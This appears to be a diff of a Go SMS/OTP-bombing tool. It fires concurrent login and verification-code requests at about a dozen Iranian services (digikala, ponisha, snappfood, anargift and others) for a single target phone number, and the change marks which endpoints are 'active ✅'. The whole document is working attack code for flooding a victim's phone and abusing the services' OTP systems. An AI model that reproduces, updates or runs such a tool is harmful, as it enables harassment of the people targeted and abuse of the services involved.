@@ -212,12 +212,12 @@ func main() {
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
 			"username": phone,
-		}, &wg, ch)
+		}, &wg, ch)  // active ✅
 		// ponisha.ir (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://api.ponisha.ir/api/v1/auth/register", map[string]interface{}{
 			"mobile": phone,
-		}, &wg, ch)
+		}, &wg, ch)  // active ✅
 		// api.bitycle.com (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://api.bitycle.com/api/account/request_otp", map[string]interface{}{
@@ -232,12 +232,12 @@ func main() {
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://uiapi2.saapa.ir/api/otp/sendCode", map[string]interface{}{
 			"mobile": phone,
-		}, &wg, ch)
+		}, &wg, ch)  // active ✅
 		// api.komodaa.com (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://api.komodaa.com/api/v2.6/loginRC/request", map[string]interface{}{
 			"phone_number": phone,
-		}, &wg, ch)
+		}, &wg, ch)  // active ✅
 		// khodro45.com (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{
@@ -247,13 +247,12 @@ func main() {
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://ssr.anargift.com/api/v1/auth", map[string]interface{}{
 			"mobile": phone,
-		}, &wg, ch)
-
+		}, &wg, ch)  // active ✅
 		// ssr.anargift.com auth/send_code (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://ssr.anargift.com/api/v1/auth/send_code", map[string]interface{}{
 			"mobile": phone,
-		}, &wg, ch)
+		}, &wg, ch)  // active ✅
 
 
 		// digitalsignup.snapp.ir otp (JSON)
@@ -274,7 +273,7 @@ func main() {
 		 	formData := url.Values{}
 		 	formData.Set("cellphone", p)
 		 	sendFormRequest(ctx, "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418", formData, &wg, ch)
-		 }(phone)
+		 }(phone)   // active ✅
 
 
 	// Goroutine to wait for all requests to complete and then close the channel.
